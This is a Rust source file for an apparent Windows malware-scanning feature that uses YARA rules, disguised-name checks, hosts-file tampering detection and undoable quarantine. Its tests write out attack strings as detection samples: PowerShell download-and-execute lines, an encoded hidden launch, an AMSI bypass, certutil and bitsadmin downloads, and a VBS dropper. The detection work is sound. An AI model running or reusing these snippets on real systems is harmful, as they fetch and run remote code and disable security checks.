// Tokkip's own look for malware, next to Defender: our YARA rules
// (rules/yara/tokkip.yar, run by boreal, MIT/Apache-2.0) on the programs,
// scripts and shortcuts in the places malware likes (Downloads, Desktop,
// Documents, Temp, AppData, the Startup folders, Public), plus a few checks of
// our own: names that pretend to be documents ("factura.pdf.exe", a reversed
// name), programs and scripts sitting in a Startup folder, screensavers outside
// Windows, and a hosts file that redirects Windows Update, Defender or banks.
// Look first, then touch: it only finds; quarantine (a move into the app's
// folder, undoable) or ignore happen when you choose. Nothing leaves the PC:
// the rules come with the app. Following the old Healthy PC (Kudu, MIT): its
// heuristics' ideas (injection imports anchored by packing or W+X sections,
// double extensions, script markers, hosts tampering), rewritten.

use super::Progress;
use serde::{Deserialize, Serialize};
use std::path::{Path, PathBuf};

const RULES_SRC: &str = include_str!("../../../rules/yara/tokkip.yar");

/// Each rule's severity and what the page says about it (the rule names are a contract with the .yar).
pub const RULES: [(&str, Severity, &str); 7] = [
    ("tokkip_pe_injector", Severity::High, "injector"),
    ("tokkip_ps_download_run", Severity::High, "downloadRun"),
    ("tokkip_ps_encoded", Severity::High, "encoded"),
    ("tokkip_ps_amsi_bypass", Severity::High, "amsi"),
    ("tokkip_lolbin_download", Severity::Medium, "lolbin"),
    ("tokkip_script_dropper", Severity::High, "dropper"),
    ("tokkip_lnk_hidden_shell", Severity::High, "hiddenShell"),
];

#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq, PartialOrd, Ord)]
#[serde(rename_all = "camelCase")]
pub enum Severity {
    Medium,
    High,
}

#[derive(Debug, Clone, Serialize, PartialEq)]
#[serde(rename_all = "camelCase")]
pub struct Finding {
    pub id: u64,
    pub path: String,
    pub name: String,
    pub size: u64,
    pub severity: Severity,
    /// Why, as keys the page explains: a rule's ("injector", "downloadRun"…) or a check's
    /// ("doubleExtension", "reversedName", "startup", "screensaver").
    pub why: Vec<String>,
}

/// A hosts-file line that sends a well-known address somewhere else.
#[derive(Debug, Clone, Serialize, PartialEq)]
#[serde(rename_all = "camelCase")]
pub struct HostsLine {
    pub line: String,
    pub host: String,
    pub to: String,
}

#[derive(Debug, Clone, Serialize, Default)]
#[serde(rename_all = "camelCase")]
pub struct Found {
    pub findings: Vec<Finding>,
    pub hosts: Vec<HostsLine>,
    /// Files looked at, and those that couldn't be read (in use, no permission).
    pub looked: u64,
    pub skipped: u64,
    pub cancelled: bool,
}

/// The rules, compiled once.
pub fn scanner() -> Result<boreal::Scanner, String> {
    let mut c = boreal::Compiler::new();
    c.add_rules_str(RULES_SRC).map_err(|e| format!("{e:?}"))?;
    Ok(c.finalize())
}

const PE: [&str; 6] = ["exe", "dll", "scr", "com", "pif", "cpl"];
const SCRIPTS: [&str; 13] = ["ps1", "psm1", "vbs", "vbe", "js", "jse", "wsf", "wsh", "hta", "bat", "cmd", "lnk", "url"];
const DOCS: [&str; 18] = [
    "pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "txt", "rtf", "jpg", "jpeg", "png", "gif", "mp3", "mp4", "zip", "rar", "csv",
];
/// What runs when opened (the second extension of a disguised name).
const RUNS: [&str; 13] = ["exe", "scr", "com", "pif", "cpl", "bat", "cmd", "js", "jse", "vbs", "vbe", "hta", "lnk"];

fn ext(name: &str) -> Option<String> {
    Path::new(name).extension().map(|e| e.to_string_lossy().to_lowercase())
}

/// "factura.pdf.exe": a document's name with a program's extension at the end.
pub fn double_extension(name: &str) -> bool {
    let lower = name.to_lowercase();
    let mut parts = lower.rsplitn(3, '.');
    let (Some(last), Some(before), Some(_)) = (parts.next(), parts.next(), parts.next()) else { return false };
    RUNS.contains(&last) && DOCS.contains(&before.trim_end())
}

/// A right-to-left override hides the real extension ("fotogpj.exe" shown as "fotoexe.jpg").
pub fn reversed_name(name: &str) -> bool {
    name.chars().any(|c| matches!(c, '\u{202E}' | '\u{202D}' | '\u{200F}'))
}

/// Worth reading: programs, scripts and shortcuts, under a size where rules make sense.
pub fn worth_reading(name: &str, size: u64) -> bool {
    match ext(name) {
        Some(e) if PE.contains(&e.as_str()) => size <= 32 << 20,
        Some(e) if SCRIPTS.contains(&e.as_str()) => size <= 4 << 20,
        _ => false,
    }
}

/// The checks that only need the name and where it is.
pub fn name_checks(name: &str, in_startup: bool) -> Vec<(&'static str, Severity)> {
    let mut why = Vec::new();
    if double_extension(name) {
        why.push(("doubleExtension", Severity::High));
    }
    if reversed_name(name) {
        why.push(("reversedName", Severity::High));
    }
    let e = ext(name).unwrap_or_default();
    if in_startup && (PE.contains(&e.as_str()) || (SCRIPTS.contains(&e.as_str()) && e != "lnk" && e != "url")) {
        why.push(("startup", Severity::Medium));
    }
    if e == "scr" {
        why.push(("screensaver", Severity::Medium));
    }
    why
}

/// Runs the rules over a file's bytes; the matching rules' keys and severities.
pub fn rule_checks(scanner: &boreal::Scanner, bytes: &[u8]) -> Vec<(&'static str, Severity)> {
    let rules = match scanner.scan_mem(bytes) {
        Ok(r) => r.rules,
        Err((_, r)) => r.rules,
    };
    rules
        .iter()
        .filter_map(|r| RULES.iter().find(|(n, _, _)| *n == r.name).map(|(_, s, k)| (*k, *s)))
        .collect()
}

// ── Hosts ──────────────────────────────────────────────────────────────────

/// Addresses that should never be redirected: Windows Update, Defender, Microsoft's sign-in, banks and the big sites.
const KEEP_HOSTS: [&str; 22] = [
    "windowsupdate.com", "update.microsoft.com", "download.microsoft.com", "microsoft.com", "live.com", "microsoftonline.com",
    "wdcp.microsoft.com", "smartscreen.microsoft.com", "defender.microsoft.com", "malwarebytes.com", "avast.com", "kaspersky.com",
    "eset.com", "google.com", "gmail.com", "youtube.com", "facebook.com", "paypal.com", "mercadopago.com", "bbva.mx", "banorte.com", "santander.com.mx",
];

/// Lines of a hosts file that send one of those addresses elsewhere (or nowhere).
pub fn hosts_tampering(text: &str) -> Vec<HostsLine> {
    let mut out = Vec::new();
    for raw in text.lines() {
        let line = raw.split('#').next().unwrap_or("").trim();
        let mut parts = line.split_whitespace();
        let Some(to) = parts.next() else { continue };
        for host in parts {
            let h = host.to_lowercase();
            let hit = KEEP_HOSTS.iter().any(|k| h == *k || h.ends_with(&format!(".{k}")));
            if hit {
                out.push(HostsLine { line: raw.trim().to_string(), host: h, to: to.to_string() });
                break;
            }
        }
    }
    out
}

/// The hosts file without those lines (the rest, comments included, stays as it was).
pub fn hosts_without(text: &str, drop: &[HostsLine]) -> String {
    let gone: Vec<&str> = drop.iter().map(|l| l.line.as_str()).collect();
    let mut out: Vec<&str> = text.lines().filter(|l| !gone.contains(&l.trim())).collect();
    if text.ends_with('\n') {
        out.push("");
    }
    out.join("\r\n")
}

pub fn hosts_path() -> PathBuf {
    let root = std::env::var("SystemRoot").unwrap_or_else(|_| r"C:\Windows".into());
    Path::new(&root).join(r"System32\drivers\etc\hosts")
}

// ── The walk ───────────────────────────────────────────────────────────────

/// Where it looks, how deep, and whether it's a Startup folder.
pub fn places() -> Vec<(PathBuf, usize, bool)> {
    let home = crate::fsx::home();
    let env = |n: &str| std::env::var(n).ok().map(PathBuf::from);
    let mut out = vec![(home.join("Downloads"), 5, false), (home.join("Desktop"), 4, false), (home.join("Documents"), 4, false)];
    if let Some(t) = env("TEMP") {
        out.push((t, 4, false));
    }
    if let Some(a) = env("APPDATA") {
        out.push((a.join(r"Microsoft\Windows\Start Menu\Programs\Startup"), 2, true));
        out.push((a, 4, false));
    }
    if let Some(p) = env("ProgramData") {
        out.push((p.join(r"Microsoft\Windows\Start Menu\Programs\StartUp"), 2, true));
    }
    if let Some(p) = env("PUBLIC") {
        out.push((p, 4, false));
    }
    out.retain(|(p, _, _)| p.is_dir());
    out
}

/// Folders not worth walking: other programs' caches and code trees.
fn skip_dir(name: &str) -> bool {
    matches!(
        name.to_lowercase().as_str(),
        "node_modules" | ".git" | "cache" | "code cache" | "gpucache" | "cachestorage" | "service worker" | "indexeddb" | "packages" | "crashpad"
    )
}

/// Looks everywhere in `places`, leaving out what was ignored (by content hash).
pub fn scan(
    places: &[(PathBuf, usize, bool)],
    ignored: &[String],
    progress: &Progress,
    keep: &mut dyn FnMut(PathBuf, crate::fsx::Identity) -> u64,
) -> Found {
    let mut found = Found::default();
    let scanner = match scanner() {
        Ok(s) => s,
        Err(_) => return found,
    };
    let mut seen = std::collections::HashSet::new();
    'places: for (root, depth, startup) in places {
        let walk = walkdir::WalkDir::new(root).max_depth(*depth).follow_links(false).into_iter();
        for entry in walk.filter_entry(|e| !(e.file_type().is_dir() && skip_dir(&e.file_name().to_string_lossy()))) {
            if progress.cancelled() {
                found.cancelled = true;
                break 'places;
            }
            let Ok(entry) = entry else { continue };
            if !entry.file_type().is_file() {
                continue;
            }
            let path = entry.path().to_path_buf();
            if !seen.insert(path.clone()) {
                continue;
            }
            let name = entry.file_name().to_string_lossy().to_string();
            let Ok(meta) = entry.metadata() else { continue };
            let size = meta.len();
            let mut why = name_checks(&name, *startup);
            if worth_reading(&name, size) {
                found.looked += 1;
                progress.tick(found.looked, 0, &path);
                match std::fs::read(&path) {
                    Ok(bytes) => {
                        let mut hits = rule_checks(&scanner, &bytes);
                        if !hits.is_empty() || !why.is_empty() {
                            let hash = blake3::hash(&bytes).to_hex().to_string();
                            if ignored.contains(&hash) {
                                continue;
                            }
                        }
                        why.append(&mut hits);
                    }
                    Err(_) => found.skipped += 1,
                }
            }
            if why.is_empty() {
                continue;
            }
            let severity = why.iter().map(|(_, s)| *s).max().unwrap_or(Severity::Medium);
            let id = keep(path.clone(), crate::fsx::Identity::of(&meta));
            found.findings.push(Finding {
                id,
                path: path.display().to_string(),
                name,
                size,
                severity,
                why: why.into_iter().map(|(k, _)| k.to_string()).collect(),
            });
        }
    }
    if let Ok(text) = std::fs::read_to_string(hosts_path()) {
        found.hosts = hosts_tampering(&text);
    }
    found.findings.sort_by(|a, b| b.severity.cmp(&a.severity).then(a.path.cmp(&b.path)));
    found
}

// ── Quarantine ─────────────────────────────────────────────────────────────

/// A file in quarantine: moved into the app's folder under a name Windows won't run.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Default)]
#[serde(rename_all = "camelCase", default)]
pub struct Quarantined {
    pub file: String,
    pub original: String,
    pub name: String,
    pub size: u64,
    pub at: u64,
    pub why: Vec<String>,
}

/// Moves a file (across drives too). Fails when it's in use: nothing is forced.
pub fn move_file(from: &Path, to: &Path) -> std::io::Result<()> {
    if std::fs::rename(from, to).is_ok() {
        return Ok(());
    }
    std::fs::copy(from, to)?;
    if let Err(e) = std::fs::remove_file(from) {
        let _ = std::fs::remove_file(to);
        return Err(e);
    }
    Ok(())
}

/// Puts a quarantined file back where it was, unless something else is there now.
pub fn restore(q: &Quarantined) -> Result<(), String> {
    let original = Path::new(&q.original);
    if original.exists() {
        return Err("taken".into());
    }
    if let Some(parent) = original.parent() {
        std::fs::create_dir_all(parent).map_err(|e| e.to_string())?;
    }
    move_file(Path::new(&q.file), original).map_err(|e| e.to_string())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn hits(src: &str) -> Vec<&'static str> {
        rule_checks(&scanner().unwrap(), src.as_bytes()).into_iter().map(|(k, _)| k).collect()
    }

    #[test]
    fn the_rules_compile_and_match_the_table() {
        scanner().expect("rules compile");
        for (name, _, _) in RULES.iter() {
            assert!(RULES_SRC.contains(&format!("rule {name}\n")), "{name} is in tokkip.yar");
        }
        let in_file = RULES_SRC.matches("\nrule ").count();
        assert_eq!(in_file, RULES.len(), "every rule has a row");
    }

    #[test]
    fn download_and_run_powershell() {
        assert_eq!(hits("$c = New-Object Net.WebClient; IEX ($c.DownloadString('http://x/a.ps1'))"), vec!["downloadRun"]);
        assert!(hits("$c = New-Object Net.WebClient; $c.DownloadFile('http://x/a.zip', 'a.zip')").is_empty(), "only downloading is fine");
        assert!(hits("Write-Host 'Hola'; Invoke-Expression $cmd").is_empty(), "only running is fine");
    }

    #[test]
    fn encoded_powershell() {
        let b64 = "A".repeat(200);
        assert_eq!(hits(&format!("powershell.exe -NoP -w hidden -enc {b64}")), vec!["encoded"]);
        assert!(hits("powershell -enc short").is_empty());
    }

    #[test]
    fn amsi_bypass_and_lolbins() {
        assert_eq!(hits("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed')"), vec!["amsi"]);
        assert_eq!(hits("certutil.exe -urlcache -split -f http://x/a.exe a.exe"), vec!["lolbin"]);
        assert_eq!(hits("bitsadmin /transfer job http://x/a.exe C:\\a.exe"), vec!["lolbin"]);
        assert!(hits("certutil -hashfile a.iso SHA256").is_empty());
    }

    #[test]
    fn vbs_dropper() {
        let s = r#"Set x = CreateObject("MSXML2.XMLHTTP") : Set s = CreateObject("ADODB.Stream") : CreateObject("WScript.Shell").Run "a.exe""#;
        assert_eq!(hits(s), vec!["dropper"]);
        assert!(hits(r#"CreateObject("WScript.Shell").Run "notepad""#).is_empty());
    }

    #[test]
    fn plain_files_match_nothing() {
        assert!(hits("@echo off\r\necho Hola\r\npause\r\n").is_empty());
        assert!(hits("MZ just some bytes that are not a real program").is_empty());
    }

    #[test]
    fn disguised_names() {
        assert!(double_extension("Factura.PDF.exe"));
        assert!(double_extension("foto.jpg.scr"));
        assert!(double_extension("contrato.docx .exe"));
        assert!(!double_extension("setup.exe"));
        assert!(!double_extension("my.program.exe"));
        assert!(!double_extension("notas.txt"));
        assert!(reversed_name("foto\u{202E}gpj.exe"));
        assert!(!reversed_name("foto.jpg"));
    }

    #[test]
    fn name_checks_by_place() {
        assert_eq!(name_checks("helper.exe", true), vec![("startup", Severity::Medium)]);
        assert!(name_checks("Spotify.lnk", true).is_empty(), "shortcuts in Startup are normal");
        assert!(name_checks("helper.exe", false).is_empty());
        assert_eq!(name_checks("bonito.scr", false), vec![("screensaver", Severity::Medium)]);
    }

    #[test]
    fn what_is_read() {
        assert!(worth_reading("a.exe", 1000));
        assert!(!worth_reading("a.exe", 64 << 20));
        assert!(worth_reading("a.ps1", 1000));
        assert!(!worth_reading("a.mp4", 1000));
    }

    #[test]
    fn hosts_redirects() {
        let text = "# hosts\r\n127.0.0.1 localhost\r\n0.0.0.0 download.windowsupdate.com\r\n1.2.3.4 www.paypal.com # phish\r\n0.0.0.0 ads.example.com\r\n";
        let bad = hosts_tampering(text);
        assert_eq!(bad.len(), 2);
        assert_eq!(bad[0].host, "download.windowsupdate.com");
        assert_eq!(bad[1].to, "1.2.3.4");
        let fixed = hosts_without(text, &bad);
        assert!(fixed.contains("localhost") && fixed.contains("ads.example.com") && fixed.contains("# hosts"));
        assert!(!fixed.contains("windowsupdate") && !fixed.contains("paypal"));
    }

    #[test]
    fn quarantine_round_trip() {
        let dir = tempfile::tempdir().unwrap();
        let file = dir.path().join("a").join("x.exe");
        std::fs::create_dir_all(file.parent().unwrap()).unwrap();
        std::fs::write(&file, b"MZ").unwrap();
        let q = dir.path().join("q.cuarentena");
        move_file(&file, &q).unwrap();
        assert!(!file.exists() && q.exists());
        let item = Quarantined { file: q.display().to_string(), original: file.display().to_string(), ..Default::default() };
        restore(&item).unwrap();
        assert!(file.exists() && !q.exists());
        std::fs::write(&q, b"MZ").unwrap();
        assert_eq!(restore(&item), Err("taken".into()), "never overwrites");
    }

    #[test]
    fn scan_finds_and_ignores() {
        let dir = tempfile::tempdir().unwrap();
        let bad = "IEX (New-Object Net.WebClient).DownloadString('http://x')";
        std::fs::write(dir.path().join("run.ps1"), bad).unwrap();
        std::fs::write(dir.path().join("Factura.pdf.exe"), b"MZ").unwrap();
        std::fs::write(dir.path().join("ok.ps1"), "Write-Host hola").unwrap();
        let places = vec![(dir.path().to_path_buf(), 3, false)];
        let mut n = 0;
        let f = scan(&places, &[], &Progress::quiet(), &mut |_, _| {
            n += 1;
            n
        });
        let names: Vec<_> = f.findings.iter().map(|x| x.name.as_str()).collect();
        assert_eq!(names.len(), 2, "{names:?}");
        assert!(names.contains(&"run.ps1") && names.contains(&"Factura.pdf.exe"));
        let hash = blake3::hash(bad.as_bytes()).to_hex().to_string();
        let f = scan(&places, &[hash], &Progress::quiet(), &mut |_, _| 1);
        assert_eq!(f.findings.len(), 1, "an ignored file stays out");
    }
}
